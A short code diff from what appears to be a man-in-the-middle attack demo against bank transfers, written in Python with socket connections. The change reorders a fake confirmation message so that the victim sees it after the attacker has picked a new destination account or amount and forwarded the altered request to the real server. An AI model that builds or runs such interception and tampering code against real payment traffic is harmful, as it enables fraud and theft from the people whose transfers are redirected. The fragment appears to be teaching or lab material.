@@ -34,9 +34,6 @@ def threaded_client(connection):
     # MITM ATTACK
 
     if(attack_option=="2"):
-        connection.send(str.encode('\n[+] It will be transfered {} from {} to {} in 2-3 working days. Thanks for your patience.\nYour transfer id is: 00000-00000\n'.format(
-            str(message_dec).split(":")[2], str(message_dec).split(":")[0], str(message_dec).split(":")[1])))
-
         field=input("\n[+] Select the field you want to change (1: Destination account - 2: Amount - 3: Both): ")
         if(field=="1"):
             new_destination=input("\nInsert new destination account: ")
@@ -70,7 +67,9 @@ def threaded_client(connection):
             response = server.recv(2048)
             print("\n[↓] Server Response [↓] ")
             print(response.decode())
-
+        
+        connection.send(str.encode('\n[+] It will be transfered {} from {} to {} in 2-3 working days. Thanks for your patience.\nYour transfer id is: 00000-00000\n'.format(
+            str(message_dec).split(":")[2], str(message_dec).split(":")[0], str(message_dec).split(":")[1])))
 
     # REPLAY ATTACK
 
